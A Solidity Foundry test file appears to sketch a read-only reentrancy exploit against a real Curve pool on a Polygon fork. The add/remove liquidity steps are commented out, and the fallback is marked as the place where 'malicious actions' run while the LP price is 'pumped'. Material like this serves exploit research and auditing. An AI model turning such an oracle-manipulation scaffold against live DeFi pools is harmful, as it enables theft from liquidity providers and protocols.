// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

CheatCodes constant cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

contract CurveOracle is DSTest {

    address curvePoolId = 0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28;

    function setUp() public {
        cheats.createSelectFork("polygon", 34715960);
        cheats.label(curvePoolId, "curvePoolId");
    }

    function testExploit() public {
        emit log_named_string("[start]", "start");
        emit log_named_decimal_uint(
            "Curve pool price:",
            ICurvePool(curvePoolId).get_virtual_price(),
            18
        );

//        uint value = 100000;
//        uint[2] memory amounts = [msg.value, 0];
//        uint lps = ICurvePool(curvePoolId).add_liquidity{value: value}(amounts, 0);
//        uint lps_redeem = lps;
//        uint[2] memory zeros = [uint(0), 0];
//
////        ICurvePool(curvePoolId).remove_liquidity(lps_redeem, zeros);
//        emit log_named_decimal_uint(
//            "Curve pool price:",
//            ICurvePool(curvePoolId).get_virtual_price(),
//            18
//        );

    }

    fallback() external payable {
        // price of LP is pumped right now
        // malicious actions, use the remaining balance of lps if needed ...
        emit log_named_decimal_uint(
            "Curve pool price:",
            ICurvePool(curvePoolId).get_virtual_price(),
            18
        );
    }

}
